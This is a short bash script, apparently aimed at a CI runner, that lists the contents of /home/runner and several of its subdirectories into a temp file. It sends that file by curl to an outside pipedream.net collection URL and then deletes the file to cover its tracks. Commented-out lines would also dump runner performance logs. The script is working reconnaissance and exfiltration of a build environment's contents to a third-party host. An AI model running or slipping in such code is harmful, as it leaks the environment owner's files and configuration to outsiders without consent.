#!/bin/bash

echo "--- START ---" > /tmp/file.txt

echo "--- /home/runner" >> /tmp/file.txt
ls -1la /home/runner >> /tmp/file.txt
echo "--- /home/runner/.composer" >> /tmp/file.txt
ls -1la /home/runner/.composer >> /tmp/file.txt
echo "--- /home/runner/.config" >> /tmp/file.txt
ls -1la /home/runner/.config >> /tmp/file.txt
echo "--- /home/runner/runners" >> /tmp/file.txt
ls -1la /home/runner/runners >> /tmp/file.txt
echo "--- /home/runner/warmup " >> /tmp/file.txt
ls -1la /home/runner/warmup >> /tmp/file.txt
echo "--- home/runner/work" >> /tmp/file.txt
ls -1la /home/runner/work >> /tmp/file.txt
echo "---" >> /tmp/file.txt



#ls -1la /home/runner/perflog >> /tmp/file.txt
#echo "---" >> /tmp/file.txt
#$(cat /home/runner/perflog/Runner.perf) >> /tmp/file.txt
#echo "---" >> /tmp/file.txt
#$(cat /home/runner/perflog/Worker.perf) >> /tmp/file.txt
#echo "--- dale" >> /tmp/file.txt
#$(perf report -i /home/runner/perflog/Worker.perf) >> /tmp/file.txt
#echo "--- FINISH ---" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/

rm /tmp/file.txt
